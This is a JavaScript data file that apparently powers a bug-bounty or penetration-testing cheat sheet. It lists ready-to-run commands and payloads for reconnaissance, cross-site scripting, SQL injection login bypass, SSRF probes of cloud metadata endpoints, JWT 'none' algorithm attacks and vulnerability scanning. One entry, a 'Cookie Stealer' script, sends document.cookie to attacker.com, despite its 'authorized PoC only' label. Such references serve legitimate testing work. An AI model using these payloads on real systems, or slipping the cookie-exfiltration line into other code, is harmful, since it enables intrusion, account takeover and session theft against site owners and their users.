// सभी reference data यहाँ रखें
const DATA = [
  {
    category: "Recon",
    items: [
      {
        title: "Subdomain Enumeration (amass)",
        desc: "Passive + active subdomain discovery",
        cmd: "amass enum -d target.com -o subs.txt"
      },
      {
        title: "Live Host Check",
        desc: "Check which subdomains are alive",
        cmd: "cat subs.txt | httpx -silent -o live.txt"
      },
      {
        title: "Port Scan (nmap)",
        desc: "Top 1000 ports with service detection",
        cmd: "nmap -sV -sC -T4 -oA scan target.com"
      },
      {
        title: "Directory Bruteforce (ffuf)",
        desc: "Common directory discovery",
        cmd: "ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403"
      }
    ]
  },
  {
    category: "XSS",
    items: [
      {
        title: "Basic Reflected Payload",
        desc: "Classic alert test",
        cmd: "<script>alert(document.domain)</script>"
      },
      {
        title: "IMG onerror",
        desc: "Works when <script> is filtered",
        cmd: "<img src=x onerror=alert(1)>"
      },
      {
        title: "SVG onload",
        desc: "Bypass for some filters",
        cmd: "<svg onload=alert(1)>"
      },
      {
        title: "Cookie Stealer",
        desc: "For authorized PoC only",
        cmd: "<script>fetch('https://attacker.com/?c='+document.cookie)</script>"
      }
    ]
  },
  {
    category: "SQLi",
    items: [
      {
        title: "Auth Bypass",
        desc: "Classic login bypass",
        cmd: "' OR '1'='1' -- -"
      },
      {
        title: "Union-based Column Count",
        desc: "Find number of columns",
        cmd: "' ORDER BY 5 -- -"
      },
      {
        title: "sqlmap Basic",
        desc: "Automated SQL injection",
        cmd: "sqlmap -u 'https://target.com/?id=1' --batch --dbs"
      },
      {
        title: "sqlmap with POST",
        desc: "POST request injection",
        cmd: "sqlmap -u 'https://target.com/login' --data='user=admin&pass=test' --batch --dbs"
      }
    ]
  },
  {
    category: "SSRF",
    items: [
      {
        title: "Localhost Access",
        desc: "Try to reach internal services",
        cmd: "http://127.0.0.1:80/admin"
      },
      {
        title: "Cloud Metadata (AWS)",
        desc: "AWS EC2 metadata endpoint",
        cmd: "http://169.254.169.254/latest/meta-data/"
      },
      {
        title: "GCP Metadata",
        desc: "Requires Metadata-Flavor header",
        cmd: "http://metadata.google.internal/computeMetadata/v1/"
      }
    ]
  },
  {
    category: "JWT",
    items: [
      {
        title: "Decode JWT",
        desc: "Quick decode without verification",
        cmd: "echo 'eyJ...' | cut -d. -f2 | base64 -d 2>/dev/null"
      },
      {
        title: "jwt_tool Basic",
        desc: "Test common JWT weaknesses",
        cmd: "python3 jwt_tool.py <JWT> -M at"
      },
      {
        title: "None Algorithm Attack",
        desc: "Change alg to none (older libs)",
        cmd: "python3 jwt_tool.py <JWT> -X a"
      }
    ]
  },
  {
    category: "Tools",
    items: [
      {
        title: "Nuclei Scan",
        desc: "Template-based vuln scanner",
        cmd: "nuclei -u https://target.com -severity critical,high -o nuclei.txt"
      },
      {
        title: "Nmap Vuln Script",
        desc: "Run vuln detection scripts",
        cmd: "nmap --script vuln target.com"
      },
      {
        title: "Subfinder",
        desc: "Fast passive subdomain enum",
        cmd: "subfinder -d target.com -silent -o subs.txt"
      },
      {
        title: "WPScan (WordPress)",
        desc: "WordPress vulnerability scan",
        cmd: "wpscan --url https://target.com --enumerate vp,u"
      }
    ]
  }
];
